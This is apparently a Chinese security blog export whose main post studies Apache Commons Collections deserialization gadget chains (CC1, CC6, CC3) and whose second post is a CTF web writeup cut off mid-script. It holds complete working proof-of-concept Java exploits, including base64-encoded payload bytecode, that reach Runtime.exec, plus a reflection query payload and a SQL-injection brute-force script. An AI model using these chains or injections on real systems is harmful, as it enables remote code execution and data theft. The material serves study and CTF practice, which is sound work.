sun.reflect.annotation.AnnotationInvocationHandler构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X\n  被TransformedMap.decorate修饰的Map中必须有一个键名为X的元素\n  经过多次步入，我们可以跟进到了我们熟悉的ChainedTransformer：\n通过for循环使前一个Transformer返回的object传入下一个Transformer的transform方法\n接下来就是熟悉的通过InvokerTransformer反复去反射Runtime的方法最后执行exec\nPoc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.Map; class CommonCollections1 { public static void main(String[] args) throws Exception { /*构造恶意链*/ Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[] { String.class }, new String[] {\"calc.exe\" }), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"value\", \"xxxx\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); /*构造AnnotationInvocationHandler对象 反序列化时执行其readObject调用TransformedMap.setValue触发恶意链*/ Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);\t//满足进入到setValue的条件  /*构造序列化流*/ ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); /*反序列化*/ System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } }   Lazymap调用链 P神知识星球[代码审计]Java安全漫谈 - 11.反序列化篇(5)\nLazyMap和TransformedMap类似，都来自于Commons-Collections库，并继承AbstractMapDecorator。\nLazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的 factory.transform 。其实这也好理解，LazyMap 的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值：\n1 2 3 4 5 6 7 8 9  public Object get(Object key) { // create value for key if key is not currently in the map  if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); }   相比于TransformedMap的利用方法，LazyMap后续利用稍微复杂一些。\n原因是在sun.reflect.annotation.AnnotationInvocationHandler的readObject方法中并没有直接调用到Map的get方法。\n所以ysoserial找到了另一条路，AnnotationInvocationHandler类的invoke方法有调用到get：\n但是我们应该如何去调用到invoke方法呢？这里插一个知识点：\nJava动态代理 https://zhuanlan.zhihu.com/p/42516717\nJava作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP __call的魔术方法，要用到java.reflect.Proxy ：\n1  Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);   Proxy.newProxyInstance 的第一个参数是ClassLoader，我们用默认的即可；\n第二个参数是我们需要代理的对象集合；\n第三个参数是一个实现了InvocationHandler接口的对象（就是我们自己写的），里面包含了具体代理的逻辑。\n举个例子，写一个ExampleInvocationHandler劫持Hashmap的get方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.Map; class ExampleInvocationHandler implements InvocationHandler { protected Map map; public ExampleInvocationHandler(Map map) { this.map = map; } /*劫持get方法*/ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if (method.getName().compareTo(\"get\") == 0) { System.out.println(\"Hook method: \" + method.getName()); return \"Hacked Object\"; } return method.invoke(this.map, args); } } class App { public static void main(String[] args) throws Exception { InvocationHandler handler = new ExampleInvocationHandler(new HashMap()); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler); proxyMap.put(\"hello\", \"world\"); String result = (String) proxyMap.get(\"hello\"); System.out.println(result); } }   我调用proxyMap.get(\"hello\")本来应该得到'world'，但是经过代理，得到\"Hacked Object\"\n我们回看sun.reflect.annotation.AnnotationInvocationHandler，会发现实际上这个类实际就是一个InvocationHandler。\n我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的get\nPoc 直接看注释就懂：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; class CC1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[] { String.class }, new String[] { \"calc.exe\" }), new ConstantTransformer(1) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); /*获得AnnotationInvocationHandler的构造方法*/ Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); /*相当于AnnotationInvocationHandler代理任意对象，只要那个对象反序列化时readObject调用任意方法就会触发invoke*/ InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); /*因为我们入口点是AnnotationInvocationHandler#readObject，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹*/ handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); /*构造序列化*/ ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); /*反序列化*/ System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } }   其实就是AnnotationInvocationHandler对象代理他自己，被代理的那个AnnotationInvocationHandlerread对象的Object触发代理的invoke\nCC6 反序列化链 分析 在cc1里面提到过用AnnotationInvocationHandler构造触发点：\n 此类在jdk8u71之后删除了memberValue.setValue()，所以利用版本需要jdk\u003c8u71，这里使用jdk8u60\n 为了解决这个问题，我们需要放弃这个触发点进而寻找其他调用LazyMap#get()的地方\n答案就是org.apache.commons.collections.keyvalue.TiedMapEntry，这个类的getValue方法调用了map.get()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  public class TiedMapEntry implements Map.Entry, KeyValue, Serializable { private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) { super(); this.map = map; this.key = key; } public Object getKey() { return key; } public Object getValue() { return map.get(key); } public Object setValue(Object value) { if (value == this) { throw new IllegalArgumentException(\"Cannot set value to this map entry\"); } return map.put(key, value); } public int hashCode() { Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } public String toString() { return getKey() + \"=\" + getValue(); } }   而同类的hashCode()又调用了getValue()，所以只要找到一个可控对象.hashCode()调用\n如果跟过URLDNS链，熟悉HashMap的话，会发现其实HashMap#hash()里面有很多调用可控对象#hashCode()的地方\n当然，在java.util.HashMap#readObject 也很容易找HashMap#hash(key)这样的调用，找到了readObject就找到了反序列化的入口。\n（其实就和URLDNS一样的putVal(hash(key), key, value, false, false);那一行）\nGadget HashMap#readObject-\u003eHashMap#hash-\u003eTiedMapEntry#hashCode()-\u003eTiedMapEntry#getValue()-\u003eLazyMap#get-\u003e……\npoc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; class CommonsCollections6 { public static void main(String[] args) throws Exception { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new String[] { \"calc.exe\" }), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap  Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap, \"keykey\"); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\");\t//为了调用hashCode()  outerMap.remove(\"keykey\");\t//因为LazyMap触发要求是获取不到这个value，所以要删除  Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain, transformers); // 生成序列化字符串  ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); // 本地测试触发  System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } }   个人认为有些难理解的点：\n  关于TiedMapEntry的意义 就像名字一样，\"tied\"，意在绑定一个map里面的一个key，操作这个对象就相当于操作这个key对应的value，仔细翻阅源码就知道\n  expMap.put(tme, \"valuevalue\");\n这个一开始看的时候很奇怪，怎么看都看不懂，为啥能把一个对象put到一个map的value里面呢？ 如果理解的第一点，这个就迎刃而解了。 你把东西put进去始终是要对他进行操作（get，set等）的，put一个TiedMapEntry对象进去就是相当于可以操作绑定的key对应的value 这里相当于给outerMap的键keykey设置了一个值valuevalue\n  outerMap.remove(\"keykey\");\n因为LazyMap里面get方法触发可控对象.transform要求是获取不到这个value，否则就触发不了，所以要删除\n  CC3 反序列化链 Java动态加载字节码  可以参考“Java简单特性”一文的\"类加载机制\"\n 在Java简单特性里面提到过：\n Java程序在运行前需要先编译成.class文件。\nJava类初始化的时候会调用java.lang.ClassLoader加载类字节码，ClassLoader会调用JVM的native方法(defineClass0/1/2)来定义一个java.lang.Class实例\n 实际上，不论用什么语言写源码，只要能编译成.class文件，都可以在JVM里面加载运行。\n利用URLClassLoader加载远程class文件 Java默认类加载器是Application ClassLoader，URLClassLoader是他的父类；\nURLClassLoader继承了ClassLoader，URLClassLoader提供了加载远程资源的能力，在写漏洞利用的payload或者webshell的时候我们可以使用这个特性来加载远程的jar或者class来实现远程的类方法调用\n直接看个demo：\n1 2 3 4 5 6 7 8 9 10  import java.net.URL; import java.net.URLClassLoader; class HelloClassLoader { public static void main( String[] args ) throws Exception { URL[] urls = {new URL(\"http://localhost:8000/\")}; URLClassLoader loader = URLClassLoader.newInstance(urls); Class c = loader.loadClass(\"HelloWorld\"); c.newInstance(); } }   可以成功加载本地服务的类\n利用ClassLoader#defineClass直接加载字节码 在\"Java简单特性\"一文的\"类加载流程\"里面说过了，Java加载任何类都要经过\nClassLoader#loadClass -\u003e ClassLoader#findClass -\u003e ClassLoader#defineClass\r其中：\n  loadclass是从已加载的类缓存、父加载器等位置寻找类(这里实际上是双亲委派机制) ,在前面没有找到的情况下，执行findclass\n  findClass是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给defineClass\n  defineClass是处理前面传入的字节码，将其处理成真正的Java类\n  真正处理字节码的其实是defineClass，默认的ClassLoader#defineClass是一个内嵌在JVM中C实现的native方法。\n直接调用ClassLoader#defineClass加载字节码的demo：\n1 2 3 4 5 6 7 8 9 10 11 12  import java.lang.reflect.Method; import java.util.Base64; class HelloDefineClass { public static void main(String[] args) throws Exception { Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); byte[] code = Base64.getDecoder().decode(\"yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM\"); Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), \"Hello\", code, 0, code.length); hello.newInstance(); } }   但是问题就是ClassLoader#defineClass被调用的时候，类的对象不会被初始化，必须对象显式调用构造函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中，在defineClass时也无法被直接调用到。所以，如果我们要使用defineClass在目标机器上执行任意代码，需要想办法调用构造函数。\n在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它,但它却是我们常用的一个攻击链TemplatesImpl的基石。\n利用TemplatesImpl加载字节码 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类中定义了一个内部类 TransletClassLoader，它重写了defineClass方法，而且没有声明作用域（那就是default），即可被同一个包的类调用。\n从TransletClassLoader#defineClass()向前追溯一下调用链：\n1 2  TemplatesImpl#getOutputProperties() -\u003e TemplatesImpl#newTransformer() -\u003e TemplatesImpl#getTransletInstance() -\u003e TemplatesImpl#defineTransletClasses() -\u003e TransletClassLoader#defineClass()   最前面两个TemplatesImpl#getOutputProperties() 和 TemplatesImpl#newTransformer()是public，就可以被外部调用。\n另外，TemplatesImpl中对加载的字节码是有一定要求的：这个字节码对应的类必须 是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类。\n我们在构造的时候需要继承这个类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; import java.lang.Runtime; public class HelloTemplatesImpl extends AbstractTranslet { public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} public HelloTemplatesImpl() { super(); System.out.println(\"Hello TemplatesImpl\"); try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } }   强调一点：一定要public class，不然只能玩蛇。\n在多个Java反序列化利用链，以及fastjson、jackson的漏洞中，都曾出现过TemplatesImpl的身影\nCC3(利用InvokerTransformer) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.util.Base64; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import org.apache.commons.collections.Transformer; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; class CommonsCollectionsIntro3 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { // source: bytecodes/HelloTemplateImpl.java  byte[] code = Base64.getDecoder().decode(\"yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=\"); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][] {code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(obj), new InvokerTransformer(\"newTransformer\", null, null) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"xxxx\"); } }   很好理解，只需要将第⼀个demo中InvokerTransformer执行的\"方法\"改 成TemplatesImpl::newTransformer()\n其中，setFieldValue方法用来设置私有属性。这里设置了三个属性: bytecodes、_name和_tfactory。\n_bytecodes 是由字节码组成的数组。_name 可以是任意字符串， 只要不为null即可。_tfactory 需要是一个TransformerFactoryImpl对象，因为TemplatesImpl#defineTransletClasses()方法里有调用到_tfactory.getExternalExtensionsMap()，如果是null会出错。\n真正的CC3(避免使用InvokerTransformer) 随着2015年ysoserial工具得发布，防御技术也在不断进步，诞生了类似SerialKiller这样的⼯具\n在他最初的黑名单中过滤了InvokerTransformer，CC3就是为了bypass这一限制诞生的\ncom.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter这个类的构造⽅法中调⽤了(TransformerImpl) templates.newTransformer()，免去了我们使⽤ InvokerTransformer ⼿⼯调⽤newTransformer()⽅法这⼀步：\n当然，缺少了InvokerTransformer, TrAXFilter的构造方法也是无法调用的。这里会用到一个新的Transformer,就是org.apache.commons.collections.functors.InstantiateTransformer。\nInstantiateTransformer也是一 个实现了Transformer接口的类, 他的作用就是调用构造方法。所以，我们实现的目标就是利用InstantiateTransformer来调用到TrAXFiter的构造方法, 再利 用其构造方法里的templates.newTransformer()调用到Templateslmpl里的字节码。\nGadget 1 2 3 4  HashMap#readObject-\u003eHashMap#hash-\u003eTiedMapEntry#hashCode()-\u003eTiedMapEntry#getValue-\u003eLazyMap#get-\u003e ConstantTransformer#transform-\u003eInstantiateTransformer#transform-\u003e -\u003eTrAXFilter#TrAXFilter-\u003eTemplatesImpl#newTransformer-\u003eTemplatesImpl#getTransletInstance-\u003e TemplatesImpl#defineTransletClasses -\u003e TransletClassLoader#defineClass-\u003eRCE   poc 自己根据p神写的东西改出来的（虽然基本算都是cv），利用了LazyMap兼容了高版本的jdk\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82  import java.io.*; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.util.Base64; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import javax.xml.transform.Templates; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; class CommonsCollectionsIntro3 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { // source: bytecodes/HelloTemplateImpl.java  byte[] code = Base64.getDecoder().decode(\"yv66vgAAADQANQoACwAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQKAAgAJQcAJgcAJwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHACYHACQBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEMABMAFAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuBwAvDAAwADEBAARjYWxjDAAyADMBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAA0ABQBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAoACwAAAAAAAwABAAwADQACAA4AAAAZAAAAAwAAAAGxAAAAAQAPAAAABgABAAAACwAQAAAABAABABEAAQAMABIAAgAOAAAAGQAAAAQAAAABsQAAAAEADwAAAAYAAQAAAAwAEAAAAAQAAQARAAEAEwAUAAEADgAAAGwAAgACAAAAHiq3AAGyAAISA7YABLgABRIGtgAHV6cACEwrtgAJsQABAAwAFQAYAAgAAgAPAAAAHgAHAAAADwAEABAADAASABUAFQAYABMAGQAUAB0AFgAVAAAAEAAC/wAYAAEHABYAAQcAFwQAAQAYAAAAAgAZ\"); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][] {code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] { Templates.class }, new Object[] { obj }) }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap, \"keykey\"); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\"); //为了调用hashCode()  outerMap.remove(\"keykey\"); //因为LazyMap触发要求是获取不到这个value，所以要删除  Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain, transformers); // 生成序列化字符串  ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); //序列化流写入文件 // try // { // FileOutputStream fileOut = new FileOutputStream(\"D:\\\\tmp\\\\e.ser\"); // ObjectOutputStream out = new ObjectOutputStream(fileOut); // out.writeObject(expMap); // out.close(); // fileOut.close(); // System.out.println(\"Serialized data is saved in D:\\\\tmp\\\\e.ser\"); // }catch(IOException i) // { // i.printStackTrace(); // }  // 本地测试触发  System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } }   利用了cc6的TiedMapEntry来通杀Java7和8，由于触发的时候会报错退出，使用了fakeTransformers来避免构造时触发，最后在生成序列化数据流的时候再把真正的ChainedTransformer替换进去\n","description":"","tags":["Java","反序列化"],"title":"ApacheCommonsCollections利用链乱记","uri":"/posts/apachecommonscollections%E5%88%A9%E7%94%A8%E9%93%BE%E4%B9%B1%E8%AE%B0/"},{"categories":["ctf_writeup"],"content":"就发下web的，所有wp戳这里-\u003e第十四届全国大学生信息安全竞赛初赛 Writeup by X1cT34m\nWeb easy_source 原题，ReflectionMethod 构造 User 类中的函数方法，再通过 getDocComment 获取函数的注释\nhttps://r0yanx.com/2020/10/28/fslh-writeup/\n提交参数：\n?rc=ReflectionMethod\u0026ra=User\u0026rb=a\u0026rd=getDocComment\r爆破rb的值a-z，在q得到flag：\nCISCN{fvsgF-5rRwf-p8KZP-vOndu-SIQoM-}\neasy_sql fuzz：\nsqlmap得到表名flag和一个列名id：报错加无列名注入\n一开始用按位比较：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  import requests url = 'http://124.70.35.238:23511/' def add(flag): res = '' res += flag return res flag = '' for i in range(1,200): for char in range(32, 127): hexchar = add(flag + chr(char)) payload = \"1') or (select 1,'NO','CISCN{JGHHS-JPD52-IJK4O-MGPDZ-DUFWI-')\u003e=(select * from security.flag limit 1)#\".format(hexchar) data = {\"uname\":\"admin\",'passwd':payload} r = requests.post(url=url, data=data) text = 